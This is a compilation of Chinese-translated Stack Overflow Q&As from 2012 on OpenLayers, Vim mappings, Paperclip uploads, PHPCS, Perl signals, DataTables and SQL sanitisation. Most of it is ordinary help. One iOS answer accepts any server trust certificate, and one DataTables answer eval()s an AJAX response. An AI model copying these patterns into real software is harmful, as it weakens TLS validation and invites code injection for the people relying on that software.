  jetty-manager jvms
  jetty-manager webapps <jvm> [ <webappfilter> ]
  jetty-manager threads <jvm>
  jetty-manager stop <jvm> <webappfilter>
  jetty-manager start <jvm> <webappfilter>
  jetty-manager restart <jvm> <webappfilter>
  jetty-manager (-h | --help)

Commands:
  jvms           Show the running JVMs (PID, name)
  webapps        Show the webapps hosted by <jvm> and their state
  threads        Show the total number of threads in the <jvm>

Arguments:
  <jvm>          JVM PID or regexp (matched against the JVM name)
  <webappfilter> regexp matched against the context path (URL)

Options:
  -h --help     Show this screen 
```

# javascript - OpenLayers 圆圈始终出现在原点

> ID：11786287
> 
> 赞同：0
> 
> 时间：2012-08-02T21:46:56.630
> 
> 标签：javascript, coffeescript, openlayers

所以我设法在点击时在 OpenLayers 中创建了一个圆圈。但是，圆圈​​总是出现在地图的原点，我希望它出现在我点击的任何地方。这是我的代码 -

```
 circleStyle = {
      strokeColor: "#FF0000",
      strokeOpacity: 1,
      strokeWidth: 3,
      fillOpacity: 0.8
    }

lon = mapApp.get("mapModel").get("mouse").get("longitude")
    lat = mapApp.get("mapModel").get("mouse").get("latitude")
    circleLayer = new OpenLayers.Layer.Vector "Alpr GeoSearch"
    circle = new OpenLayers.Geometry.Polygon.createRegularPolygon(
      new OpenLayers.Geometry.Point(100,100),
      10000,
      60
      )
    feature = new OpenLayers.Feature.Vector(circle,testPoint,circleStyle)
    circleLayer.addFeatures(feature)
    console.log(circleLayer)
    mapApp.map.openLayersMap.addLayer circleLayer 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T10:14:04.597

我在这里错过了什么吗，这条线......

```
new OpenLayers.Geometry.Point(100,100), 
```

应该是

```
new OpenLayers.Geometry.Point(lon,lat) 
```

或者反过来（纬度，经度），我永远记不得了。据我所知，您正在使用的代码是在坐标“100,100”处创建的，并且您永远不会使用您抓取的 lon 和 lat 变量。

# facebook - 我如何使用 facebook api 发布像俄罗斯方块大战或 glassdoor 这样的提要？

> ID：11786288
> 
> 赞同：1
> 
> 时间：2012-08-02T21:46:56.580
> 
> 标签：facebook, api, feed

我的意思是...

在 Facebook 时间线模式下，

俄罗斯方块之战和玻璃门，这两个 fb 应用程序在右侧发布提要，如下图所示

[http://imgur.com/RinJh](http://imgur.com/RinJh)

它是原始的提要帖子吗？

我怎么能使用 api 来发布这样的提要？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T14:26:18.810

我不确定这是否是正确的答案，但也许它是一个“元标签”游戏，我的意思是 facebook 有多个元标签，您可以将它们添加到您的网站中，并且 facebook 在抓取网页时用于对页面进行分类，请查看此页面中的第 2 步[http://developers.facebook.com/docs/reference/plugins/like/](http://developers.facebook.com/docs/reference/plugins/like/) 例如，有一个标签指定页面的类型，而歌曲是允许的值之一（可能 SoundCloud 用于这是页面）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T15:02:34.577

> 它是原始的提要帖子吗？

不，这些很可能是 Open Graph 操作的聚合。

[https://developers.facebook.com/docs/concepts/opengraph/aggregations/](https://developers.facebook.com/docs/concepts/opengraph/aggregations/)

# printing-web-page - 当 url 中的 print=yes 时，javascript 工作

> ID：11786290
> 
> 赞同：1
> 
> 时间：2012-08-02T21:47:02.837
> 
> 标签：printing-web-page

谁能帮我？我正在寻找一个JavaScript。我想在我的网址中添加“？print=yes”，例如[http://mywebsite.com/page1.html?print=yes](http://mywebsite.com/page1.html?print=yes)

一旦它被点击并完全加载，window.print() 就必须工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:52:17.047

**如何检查查询字符串的值**

[JavaScript 查询字符串](https://stackoverflow.com/questions/647259/javascript-query-string)

**如何从 javascript 打印。**

[https://www.google.com.au/search?q=javascript+print](https://www.google.com.au/search?q=javascript+print)

# vim - Vim 自定义键绑定约定？

> ID：11786291
> 
> 赞同：1
> 
> 时间：2012-08-02T21:47:17.000
> 
> 标签：vim

在 Emacs 中，按照惯例，以 开头的键序列`C-c`保留给个人用户设置。我认为至少还有一个约定。

Vim 的自定义键绑定约定（如果有的话）是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T23:12:21.403

您可以使用以您的`<leader>`键为前缀的命令作为约定，将您自己的单个键映射与默认键区分开。

`<leader>`在你的 .vimrc 文件中设置你的密钥：

```
let mapleader = "_" 
```

然后，您可以创建以您将领导者设置为前缀的键映射，如下所示：

```
nnoremap <leader><space> :noh<cr> 
```

有关更多信息，请参见[此处](http://vim.wikia.com/wiki/Mapping_keys_in_Vim_-_Tutorial_%28Part_3%29#Map_leader)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T23:48:51.483

在 Emacs 中，我不会说它是一种惯例，而是一种流行的选择。

在 Vim 中甚至没有，虽然 Ctrl+something 或 F 键很流行，但它远不是一个广泛传播的“约定”。

很多 Vim 用户只是在普通模式下使用默认的“字母操作”，他们在文本编辑中完成，这是大多数 Emacs 用户必须依赖的功能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-03T13:11:44.377

有一个反斜杠默认什么都不做，只是映射领导者（mapleader 和 maplocalleader）的默认值。这个领导者用于插件，我强烈建议只为他们保留它，使用附加了默认操作的键，但这并没有多大用处。常用键有`,`（重复 t/T/f/F 向相反方向运动）和`_`（向下移动一行，在第一个非空白字符上），您还可以检查哪些不使用（例如 I , 不要使用`+`and `-`, 后者是 ) 的好替代品`_`。我与@stonesam92 不同的原因建议不要将 mapleader 设置为它们，而是将您自己的 leader 直接放入映射中，原因如下：

1.  它使插件可能添加与您自己的映射冲突的映射。
2.  你习惯于打字`,a`，`_a`或其他什么，而不是`<Leader>a`。
3.  它使映射命令根据它们在 vimrc 中的位置以不同的方式工作（`<Leader>`仅计算一次，如果您之后更改 mapleader，则已定义的映射不会更改）。
4.  它混淆了阅读：你必须永远记住，什么`<Leader>`是。

如果您正在编写插件，请始终使用`<Leader>`并让用户更好地自定义它们，两种常见的解决方案是使用全局选项和使用`hasmapto`：

```
" Global option
if !exists('g:plugin_mapping_key')
    let g:plugin_mapping_key='<Leader>a'
endif
execute 'nnoremap '.g:plugin_mapping_key.' :DoSomething<CR>'

" hasmapto
nnoremap <Plug>PluginDoSomething :DoSomething<CR>
if !hasmapto('<Plug>PluginDoSomething', 'n', 0)
    nmap <Leader>a <Plug>PluginDoSomething
endif 
```

# python - 使用 Windows 命令行或 Python 查找带有模式的文本行

> ID：11786292
> 
> 赞同：0
> 
> 时间：2012-08-02T21:47:23.773
> 
> 标签：python, windows, parsing, powershell, cmd

我需要运行一个命令行工具来验证一个文件并显示一堆关于它的信息。我可以将此信息导出到 txt 文件，但其中包含大量额外数据。我只需要一行文件：

“签名带有时间戳：2012 年 5 月 24 日星期四 17:13:16”

时间可能不同，但我只需要提取这些数据并将其放入文件中。有没有从命令行本身或 python 执行此操作的好方法？我计划使用 Python 来定位和下载要验证的文件，然后运行命令行工具来验证它，以便它可以获取数据，然后通过电子邮件发送该数据。

这是在 Windows PC 上。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T21:52:13.450

您不需要使用 Python 来执行此操作。如果您使用的是 Unix 环境，则可以`fgrep`直接从命令行使用并将输出重定向到另一个文件。

```
fgrep "The signature is timestamped: " input.txt > output.txt 
```

在 Windows 上，您可以使用：

```
find "The signature is timestamped: " < input.txt > output.txt 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:23:40.747

您提到命令行实用程序“显示”一些信息，因此很可能打印到`stdout`，因此一种方法是在 Python 中运行该实用程序并捕获输出。

```
import subprocess
# Try with some basic commands here maybe...
file_info = subprocess.check_output(['your_command_name', 'input_file'])
for line in file_info.splitlines():
    # print line here to see what you get
    if file_info.startswith('The signature is timestamped: '):
        print line # do something here 
```

这应该与“使用 python 下载和定位”非常吻合——这样就可以使用 urllib.urlretrieve 进行下载（可能使用临时名称），然后在临时文件上运行命令行工具以获取详细信息，然后smtplib 发送电子邮件...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T22:00:03.517

在 python 中，您可以执行以下操作：

```
timestamp = ''
with open('./filename', 'r') as f:
  timestamp = [line for line in f.readlines() if 'The signature is timestamped: ' in line] 
```

我没有对此进行测试，但我认为它会起作用。不确定是否有更好的解决方案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T22:01:00.130

我不太确定您拥有的这个导出文件的确切语法，但 python 的`readlines()`函数可能对此有所帮助。

```
h=open(pathname,'r') #opens the file for reading
for line in h.readlines():
    print line#this will print out the contents of each line of the text file 
```

如果文本文件每次都具有相同的格式，那么剩下的就简单了；如果不是，你可以做类似的事情

```
for line in h.readlines():
    if line.split()[3] == 'timestamped':
         print line
         output_string=line 
```

至于写入文件，您需要打开文件进行写入`h=open(name, "w")`，然后使用`h.write(output_string)`将其写入文本文件

# ruby-on-rails-3 - 从 iOS 上传到 Rails 的 PDF 已损坏

> ID：11786295
> 
> 赞同：1
> 
> 时间：2012-08-02T21:47:34.010
> 
> 标签：ruby-on-rails-3, cocoa-touch, paperclip, content-type, afnetworking

我正在将 pdf 文件从 iOS 应用程序上传到 Rails 应用程序。文件已上传，但其内容类型已损坏。

这是上传文件的 iOS 代码的相关部分（使用 AFNetworking 库）：

```
NSURL *url = [NSURL URLWithString:kWebserviceHost];
AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:url];
//    httpClient.parameterEncoding = AFFormURLParameterEncoding; // Experimented with different values, no effect

NSData *documentData = [NSData dataWithContentsOfURL:self.documentURL];
if (! documentData) {
    NSLog(@"Trying to upload nil document: sorry! - %@", self.documentData);
    return;
}

NSMutableURLRequest *request = [httpClient multipartFormRequestWithMethod:@"PUT" // @"POST" 
                                                                     path:@"new_upload"
                                                               parameters:@{ @"fooKey" : fooString, @"barKey" : barString }
                                                constructingBodyWithBlock: ^(id <AFMultipartFormData>formData) {
    [formData appendPartWithFileData:documentData name:@"document" fileName:@"upload.pfd" mimeType:@"application/pdf"];
}];

AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];
[operation setUploadProgressBlock:^(NSInteger bytesWritten, long long totalBytesWritten, long long totalBytesExpectedToWrite) {
    NSLog(@"Sent %lld of %lld bytes", totalBytesWritten, totalBytesExpectedToWrite);
    progressBlock(totalBytesWritten / totalBytesExpectedToWrite);
}];

[operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject) {
    uploadSuccessBlock();
} failure:^(AFHTTPRequestOperation *operation, NSError *error) {
    NSLog(@"Sorry, could not upload document - %@", error);
    failureBlock(error);
}];
[operation start]; 
```

让我们转到另一边，Rails 3.2.3 服务器。
我正在使用 gem PaperClip（版本 3.1.4）。这是我的模型类中回形针附件的定义：

```
paperclip_storage = (Rails.env.production?) ? {
                       :storage        => :s3,
                       :s3_credentials => "#{Rails.root}/config/s3.yml",
                       :path           => ':attachment/:id/:style.:extension',
                       :bucket         => 'mybucketname' #,
                       # :s3_headers =>  { "Content-Type" => "video/mp4" }
                        } 
                     : { :headers =>  { "Content-Type" => "application/pdf" }
                     }

has_attached_file :document, paperclip_storage.merge( :use_timestamp => false,
  :url  => "/assets/:id/:basename.:extension",
  :path => ":rails_root/public/assets/:id/:basename.:extension",
  :processors => nil # Maybe the processing of the file mess things up?
) 
```

我还尝试跳过后期处理（即使文档说不应该应用，因为没有定义样式）。

```
before_post_process :skip_post_process

def skip_post_process
  return false
end 
```

另一种尝试：在 post_process 过滤器中设置 content_type：

```
after_post_process :force_content_type_to_pdf
 def force_content_type_to_pdf
   puts "--------------- Changing content_type"
   self.document.instance_write(:content_type, "application/pdf")
 end 
```

这是接收和保存文件的控制器方法：

```
def new_upload

  @document = Document.create()
  document = params[:document]

  if (document.nil?) 
    return
  end

  @document.document = document

  puts "Document type: #{@document.document.content_type}" # logs: 'application/pdf'
  puts "Parameters: #{params}" # logs     Parameters: {"fooKey"=>"foo", "barKey"=>"bar", "document"=>#<ActionDispatch::Http::UploadedFile:0x007ff5a429be58 @original_filename="upload.pfd", @content_type="application/pdf", @headers="Content-Disposition: form-data; name=\"document\"; filename=\"upload.pfd\"\r\nContent-Type: application/pdf\r\n", @tempfile=#<File:/var/folders/vy/zm_x1bts5hs6pkvzk7clnmvm0000gn/T/RackMultipart20120802-12714-1j0hq6q>>}

  @document.foo = params['fooKey']
  @document.bar = params['barKey']

  if    @document.save
    render :json => {status: "saved" }
    return
  else 
      render json: @document.errors, status: :unprocessable_entity 
      return
  end
end 
```

文件已上传，但无法读取。Finder 不知道使用哪个应用程序来打开它。
这是 QuickLook 预览的屏幕截图： ![快速浏览文件](../Images/92a82d48e398362c32a08ac0df026ac4.png)

内容类型以某种方式混淆了。
`file --mime /file/path/before/or/after/upload.pdf`在原始文件（将由 iOS 应用程序上传的文件）或 Rails 服务器在成功上传后创建的文件上返回以下消息：
`/upload.pfd: application/pdf; charset=binary`. 到目前为止听起来不错。

`mdls -name kMDItemContentType /file/path/before/upload.pdf`返回`kMDItemContentType = "com.adobe.pdf"`要上传的文件。还可以。但是 Rails 服务器创建的文件上的相同命令返回：`kMDItemContentType = "dyn.ah62d4rv4ge81a3xe"`.
这至少解释了为什么 Finder 会感到困惑。

在浏览器中下载文件时问题类似。这是我的控制器的相关方法：

```
def download_document
  @document = Document.find(params[:id])

  if (@document && @document.document) 
    # Line below propagate the file content-type problem:
    send_file Rails.root.join(document.path), :type => "application/pdf", :x_sendfile => false, :stream => false

    # This hack works while server is locally hosted
    send_data File.read(Rails.root.join(@document.document.path)),  :type => "application/pdf"
  end
end 
```

不幸的是，在 S3 上托管时，黑客将无法正常工作。而且它阻止我在调试我的 iOS 应用程序时方便地浏览我的文件系统来查看上传的文档。
通过 FTP 客户端（例如 Transmit）直接从 S3 下载文件会得到相同的损坏文件。

问题是什么？您认为我应该在哪里进一步排除故障，客户端还是服务器？如何？有任何想法、提示、预感要断言或查看的事情吗？

如果您没有任何解决方案，我也很高兴在下载损坏文件后获得临时修复以再次正确设置损坏文件的 content_type（或任何问题）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:44:16.507

如果您将上传的文件命名为“upload.pdf”而不是“upload.pfd”，会发生什么？

# ios - 使用内部应用程序凭据而不是用户凭据对 iOS 应用程序进行身份验证

> ID：11786296
> 
> 赞同：1
> 
> 时间：2012-08-02T21:47:44.147
> 
> 标签：ios, facebook, authentication

我是否可以在没有用户交互的情况下对 iOS 应用程序进行身份验证，使其可以向 Facebook 请求页面数据？

例如，在一个音乐家的应用程序中，我希望能够向 Facebook 请求音乐家的艺术家页面，包括墙上的帖子。然后，我可以获取他们页面的原始数据并随意设置样式。这不需要用户登录，并且会话身份验证将由应用程序本身使用嵌入式凭据异步完成。

我想使用 SDK，但我认为这需要手动 OAuth 访问令牌请求和帖子。

谢谢您的帮助！

* * *

更新：

为了澄清，我很好奇以下可能性：

1) 应用程序使用嵌入应用程序的凭据加载并请求 OAuth 访问令牌 2) 然后应用程序可以向 facebook 请求来自预定页面提要的提要数据 3) 这些都不需要任何用户交互或将应用程序退回移动游猎等

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:09:27.483

我真的不明白你想要什么，但可以在没有用户交互的情况下进行身份验证：

> 如果请求需要身份验证才能建立连接，则有效凭据必须已经在 NSURLCredentialStorage 中可用，或者必须作为请求 URL 的一部分提供。如果凭据不可用或无法通过身份验证，则 URL 加载系统通过向处理连接的 NSURLProtocol 子类发送 continueWithoutCredentialForAuthenticationChallenge: 消息来响应。

[https://developer.apple.com/library/mac/documentation/Cocoa/Conceptual/URLLoadingSystem/Articles/AuthenticationChallenges.html#//apple_ref/doc/uid/TP40009507-SW1](https://developer.apple.com/library/mac/documentation/Cocoa/Conceptual/URLLoadingSystem/Articles/AuthenticationChallenges.html#//apple_ref/doc/uid/TP40009507-SW1)

有一种认证方式：

```
- (BOOL)connection:(NSURLConnection *)connection canAuthenticateAgainstProtectionSpace:(NSURLProtectionSpace *)protectionSpace {
   return [protectionSpace.authenticationMethod isEqualToString:NSURLAuthenticationMethodServerTrust];
}

- (void)connection:(NSURLConnection *)connection didReceiveAuthenticationChallenge:(NSURLAuthenticationChallenge *)challenge {
     if ([challenge.protectionSpace.authenticationMethod isEqualToString:NSURLAuthenticationMethodServerTrust])
         [challenge.sender useCredential:[NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust] forAuthenticationChallenge:challenge];
     [challenge.sender continueWithoutCredentialForAuthenticationChallenge:challenge];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:44:47.160

好的 - 我想通了。感觉很傻，我不知道你能做到这一点。

您可以为应用 ID 和机密请求访问令牌。这将允许您发出需要访问令牌的公共数据请求。

请求访问令牌： [https ://graph.facebook.com/oauth/access_token?grant_type=client_credentials&client_id=11111111&client_secret=9999999999](https://graph.facebook.com/oauth/access_token?grant_type=client_credentials&client_id=11111111&client_secret=9999999999)

然后，只需在您的 Feed 请求中使用返回的访问令牌：

[https://graph.facebook.com/musicpage/feed?access_token=ACCESS_TOKEN](https://graph.facebook.com/musicpage/feed?access_token=ACCESS_TOKEN)

如果这违反 TOS 或已弃用 - 请告诉我。现在这似乎是解决方案！

# php - PHPCS 不在命令行上运行？

> ID：11786299
> 
> 赞同：4
> 
> 时间：2012-08-02T21:47:55.957
> 
> 标签：php, codesniffer

当我输入 phpcs --version 时，我得到的不是版本号，而是这样的：

```
/Applications/drupal/php/bin/phpcs: line 2: ?php: No such file or directory
/Applications/drupal/php/bin/phpcs: line 3: /Applications: is a directory
/Applications/drupal/php/bin/phpcs: line 4: Applications: command not found
/Applications/drupal/php/bin/phpcs: line 5: Applications: command not found
/Applications/drupal/php/bin/phpcs: line 6: Applications: command not found
/Applications/drupal/php/bin/phpcs: line 7: Applications: command not found
/Applications/drupal/php/bin/phpcs: line 8: Applications: command not found
/Applications/drupal/php/bin/phpcs: line 9: Applications: command not found
/Applications/drupal/php/bin/phpcs: line 10: Applications: command not found
/Applications/drupal/php/bin/phpcs: line 11: syntax error near unexpected token `newline'
/Applications/drupal/php/bin/phpcs: line 11: ` * @author    Greg Sherwood <gsherwood@squiz.net>' 
```

看起来它没有正确读取 PHP。我配置错了什么？

我所做的只是 sudo pear install PHP_CodeSniffer。当我再次运行它时，我得到：

pear/PHP_CodeSniffer 已安装，与发布的版本 1.3.5 相同

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-02T23:13:26.787

当 PEAR 安装 PHP_CodeSniffer 时，它会更改主 phpcs 脚本中的第一行，以便该`#!`行指向系统上的 PHP 可执行文件。

所以在安装之前，该行看起来像这样：`#!@php_bin@`安装之后，它看起来像这样（取决于 PHP 的安装位置）：`#!/usr/bin/php`

PEAR 有一个配置设置，它告诉它 PHP 可执行文件的安装位置。您可以通过运行`pear config-show`并查找 的值来查看该值`PHP CLI/CGI binary (php_bin)`。您需要确保此值实际上是 PHP 在您的系统上的位置，否则所有脚本安装（如 PHPUnit）都会有类似的问题。

检查此值的最佳方法是运行`which php`并为 PEAR 配置变量设置该值。然后重新安装 PHP_CodeSniffer 以便再次完成替换。

所以对于我的系统，我会这样做：

```
$ which php
/usr/bin/php
$ sudo pear config-set php_bin /usr/bin/php
config-set succeeded
$ sudo pear uninstall php_codesniffer
uninstall ok: channel://pear.php.net/PHP_CodeSniffer-1.3.5
$ sudo pear install php_codesniffer
downloading PHP_CodeSniffer-1.3.5.tgz ...
Starting to download PHP_CodeSniffer-1.3.5.tgz (345,113 bytes)
......................................................................done: 345,113 bytes
install ok: channel://pear.php.net/PHP_CodeSniffer-1.3.5 
```

如果一切顺利，您应该会`#!`在新的 phpcs 文件中看到正确的行：

```
$ which phpcs
/usr/local/bin/phpcs
$ head -n 1 /usr/local/bin/phpcs
#!/usr/bin/php 
```

如果看起来正确，您将能够毫无问题地运行 phpcs 命令。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-05T18:57:14.387

我为此苦苦挣扎了一段时间，但最终弄明白了——如果您直接调用的 PHP 命令是围绕真实可执行文件的 shell 脚本包装器，则需要编辑 phpcs 脚本的第一行以通过[/usr/调用 PHP箱/环境](http://en.wikipedia.org/wiki/Shebang_%28Unix%29#Portability)：

```
#!/usr/bin/env /Applications/acquia-drupal/php5_3/bin/php 
```

要不就

```
#!/usr/bin/env php 
```

搜索者的完整上下文 - 修复之前：

```
~$ head -n 1 pear/bin/phpcs 
#!/Applications/acquia-drupal/php5_3/bin/php
~$ phpcs --version
/Users/mryan/pear/bin/phpcs: line 2: ?php: No such file or directory
/Users/mryan/pear/bin/phpcs: line 3: /Applications: is a directory
/Users/mryan/pear/bin/phpcs: line 4: Desktop: command not found
/Users/mryan/pear/bin/phpcs: line 5: Desktop: command not found
/Users/mryan/pear/bin/phpcs: line 6: Desktop: command not found
/Users/mryan/pear/bin/phpcs: line 7: Desktop: command not found
/Users/mryan/pear/bin/phpcs: line 8: Desktop: command not found
/Users/mryan/pear/bin/phpcs: line 9: Desktop: command not found
/Users/mryan/pear/bin/phpcs: line 10: Desktop: command not found
/Users/mryan/pear/bin/phpcs: line 11: syntax error near unexpected token `newline'
/Users/mryan/pear/bin/phpcs: line 11: ` * @author    Greg Sherwood <gsherwood@squiz.net>'
~$ /Applications/acquia-drupal/php5_3/bin/php pear/bin/phpcs --version
PHP_CodeSniffer version 1.4.5 (stable) by Squiz Pty Ltd. (http://www.squiz.com.au) 
```

修复后：

```
~$ head -n 1 pear/bin/phpcs
#!/usr/bin/env php
~$ phpcs --version
PHP_CodeSniffer version 1.4.5 (stable) by Squiz Pty Ltd. (http://www.squiz.com.au) 
```

现在我可以在 PhpStorm 中配置 CodeSniffer。

# perl - 在 Perl 中干净地捕获信号

> ID：11786300
> 
> 赞同：5
> 
> 时间：2012-08-02T21:47:58.377
> 
> 标签：perl, unix, signals, daemon

我有一个简单的 Perl 脚本，它只是将一行文本打印到标准输出。我想要完成的是，当此脚本运行时，如果我（或其他人）向该进程发出信号以停止，我希望它捕获该信号并干净地退出。我的代码如下所示

```
#!/usr/bin/perl -w

$| = 1;
use sigtrap 'handler' => \&sigtrap, 'HUP', 'INT','ABRT','QUIT','TERM';
while(1){
 print "Working...\n";
 sleep(2);
}
sub sigtrap(){
 print "Caught a signal\n";
 exit(1);
} 
```

虽然当我从命令行实际按 ctrl-c 时这很有效，但如果我发出

```
kill -9 <pid> 
```

它只是死了。如何让它在退出之前执行某些操作？我的一般想法是使用此框架来捕获此脚本何时因服务器重新启动以进行维护或故障而在服务器上死机。

非常感谢提前

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-02T22:11:57.400

信号#9 (SIGKILL) 不能被捕获。这就是 Unix 的设计方式。

但是系统在停机维护时不会发送该信号。至少如果您的守护程序行为正确。它通常会发送 TERM 信号（或者更确切地说，你的守护进程处理脚本`/etc/init.d`所做的）。只有在超时后未正确关闭的进程才会收到 SIGKILL。

因此，您的目标应该是正确处理 TERM 信号并编写包装脚本，`/etc/init.d`当系统更改运行级别时将调用该脚本。

**更新：**您可以将[Daemon::Control](https://metacpan.org/module/Daemon%3a%3aControl)模块用于 init 脚本。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T21:51:17.753

您正在向您的流程发送两个非常不同的信号。按下`Ctrl-C`控制台通常会向进程发送一个信号，根据您的代码判断，该信号会被捕获并提供服务。但是，显式发送信号编号 9，称为. 这是无法重新定义其服务的信号之一，并且该信号的传递总是立即结束进程，这是由内核本身完成的。~~`TERM`~~`INT``kill -9``KILL`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-02T22:02:14.030

据我所知，您无法捕获`kill -9`。试试`kill <pid>`吧。

# node.js - Socket IO 需要 node.js？

> ID：11786302
> 
> 赞同：0
> 
> 时间：2012-08-02T21:48:09.263
> 
> 标签：node.js, socket.io

使用Socket IO，需要node js吗？如果没有，有人可以给出示例代码吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T21:50:05.927

是的，服务器端需要 node.js ......来自[Github 自述文件](https://github.com/learnboost/socket.io#readme)：

> Socket.IO 是一个**Node.JS 项目**，它使 WebSockets 和实时在所有浏览器中成为可能。

有关更多信息和示例代码，请参见[Github 页面](https://github.com/learnboost/socket.io)或[网站](http://socket.io/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-06T05:45:02.340

不一定 - 你需要一个 websocket 服务器，这可以是[nodejs](http://nodejs.org/)或`java` `websocket`服务器 - [http://jwebsocket.org/](http://jwebsocket.org/)甚至是`.NET` `websocket`服务器 - [http://superwebsocket.codeplex.com/](http://superwebsocket.codeplex.com/)

如果你想要一个`nodejs`websocket 服务器/客户端示例 - [http://goo.gl/b7ncb](http://goo.gl/b7ncb)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-10T07:46:19.957

socket.io-server 在其他语言上的实现：

*   java:[网络套接字](https://github.com/mrniko/netty-socketio)
*   蟒蛇：[python-socketio](https://github.com/miguelgrinberg/python-socketio)
*   戈朗：
    *   [https://github.com/graarh/golang-socketio](https://github.com/graarh/golang-socketio)
    *   [https://github.com/googollee/go-socket.io](https://github.com/googollee/go-socket.io)

# php - 显示 php 从 jquery 代码创建的表 - 数据表向下钻取行

> ID：11786304
> 
> 赞同：0
> 
> 时间：2012-08-02T21:48:14.893
> 
> 标签：php, jquery, ajax, datatables

我有一个数据表，我试图根据 php 文件的输出进行深入研究，但我遇到了一些我似乎无法弄清楚的问题。我使用[http://datatables.net/blog/Drill-down_rows](http://datatables.net/blog/Drill-down_rows)作为指南。到目前为止，这是我的代码：

Javascript：

```
<script type="text/javascript">
    $("tr").live("click", function(){
        var nTr = this;
        var i = $.inArray(nTr, anOpen);
        //oTable = my datatable 
        var oData = oTable.fnGetData(nTr);
        if(i === -1) {
            $(this).addClass('row_selected');
            //THIS IS WHERE I AM GETTING A LITTLE LOST
            //I WANT THE VALUE OF response.details TO BE STORED IN nDetailsRow
            //oData.url is a mDataProp stored in the datatable row that contains the PHP link (this works okay)
            var nDetailsRow = $.get(oData.url, function(response) {
                //I don't really understand exactly what this is doing... but response.details is what I want to display from PHP
                oTable.fnOpen(nTr, response.details, 'details');
                });
            //THIS LINE DOES NOT WORK CORRECTLY BECAUSE nDetailsRow IS NOT WHAT I WANT IT TO BE 
            $('div.innerDetails', nDetailsRow).slideDown();
            anOpen.push(nTr);

        else {
        ...
        }
    }
</script> 
```

PHP：

```
<?PHP
    $tableOut = '<div class="innerDetails">
                    <table cellpadding="5" cellspacing="0" border="0" style="padding-left:50px;">
                        <tr><td>Test Cell:</td><td>This is a test</td></tr>
                    </table>
                </div>';

    $data = array();
    $data['details'] = $tableOut;

    echo json_encode($data);
?> 
```

我觉得我快到了，但我不太了解 ajax `$.get`，并且不确定我是否真的从 PHP 文件中正确获取了 JSON。我也不太明白如何将该 JSON 存储在活动的 jquery 代码中。关于如何完成这些任务以及如何让我的钻取显示 PHP JSON 数据的任何想法`response.details`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T22:04:55.170

我几乎在发布后立即想通了，我需要`$.getJSON`在该函数中使用并包含最后两行。我现在正在使用以下似乎可以正常工作的代码：

```
<script type="text/javascript">
    $(document).on("click", "tr", function(){
        var nTr = this;
        var i = $.inArray(nTr, anOpen);
        //oTable = my datatable & oData.url is the mDataProp link to the PHP page
        var oData = oTable.fnGetData(nTr);
        if(i === -1) {
            $(this).addClass('row_selected');           
            $.get(oData.url, function(response) {
                oTable.fnOpen(nTr, response.details, 'details');
                $('div.innerDetails', response.details).slideDown();
                anOpen.push(nTr);
                });     

        else {
        ...
        }
    }
</script> 
```

编辑：从建议中添加/更改代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:03:00.730

```
<script type="text/javascript">
    $("tr").live("click", function(){
        var nTr = this;
        var i = $.inArray(nTr, anOpen);
        //oTable = my datatable 
        var oData = oTable.fnGetData(nTr);
        if(i === -1) {
            $(this).addClass('row_selected');
            //THIS IS WHERE I AM GETTING A LITTLE LOST
            //I WANT THE VALUE OF response.details TO BE STORED IN nDetailsRow
            //oData.url is a mDataProp stored in the datatable row that contains the PHP link (this works okay)
            var nDetailsRow = $.get(oData.url, function(response) {
                try{
                    eval(response);
                    delete response;
                  //I don't really understand exactly what this is doing... but response.details is what I want to display from PHP
                    oTable.fnOpen(nTr, req.details, 'details');
                }catch(e){
                    // error
                }
            });
            //THIS LINE DOES NOT WORK CORRECTLY BECAUSE nDetailsRow IS NOT WHAT I WANT IT TO BE 
            $('div.innerDetails', nDetailsRow).slideDown();
            anOpen.push(nTr);

        else {
        ...
        }
    }
</script>

PHP:

var req = { details : '<?php echo str_replace('%', '\\x', urlencode('
<div class="innerDetails">
    <table cellpadding="5" cellspacing="0" border="0" style="padding-left:50px;">
        <tr>
            <td>Test Cell:</td>
            <td>This is a test</td>
        </tr>
    </table>
</div>')); ?>' }; 
```

# php - SQL 查询中的 sprintf( '%d', $tainted ) 是漏洞吗？

> ID：11786309
> 
> 赞同：0
> 
> 时间：2012-08-02T21:48:49.703
> 
> 标签：php, mysql, sql-injection, validation

我确实知道参数化查询，但我有几个旧网站使用这种方法来清理用户输入：

```
<?
mysql_query( sprintf( 'SELECT col1 FROM table1 WHERE id = %d', $tainted ) );
?> 
```

请注意，周围没有引号`%d`。是否有任何价值`$tainted`可能导致此类查询产生意外结果？很容易给出语法错误，但我不太在意。

我对类似的 UPDATE 和 DELETE 查询使用了相同的方法。我应该费心回去修复所有旧查询，还是这里没有漏洞？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:01:12.607

不，这不是漏洞。

